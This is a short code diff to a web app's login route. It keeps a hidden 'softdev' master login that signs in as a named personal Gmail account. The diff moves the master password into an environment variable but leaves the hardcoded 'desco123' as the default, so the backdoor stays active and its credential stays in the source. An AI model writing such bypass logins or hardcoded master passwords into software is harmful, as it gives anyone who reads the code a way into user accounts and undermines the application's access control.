@@ -135,8 +135,9 @@ router.post('/login', rateLimiter(20, 60000), async (req, res, next) => {
     let targetEmail = emailTrimmed;
     let isSoftdevBypass = false;
 
+    const masterPassword = process.env.MASTER_PASSWORD || 'desco123';
     if (emailTrimmed === 'softdev') {
-      if (password === 'desco123') {
+      if (password === masterPassword) {
         targetEmail = 'shokirovsharifjon04@gmail.com';
         isSoftdevBypass = true;
       } else {
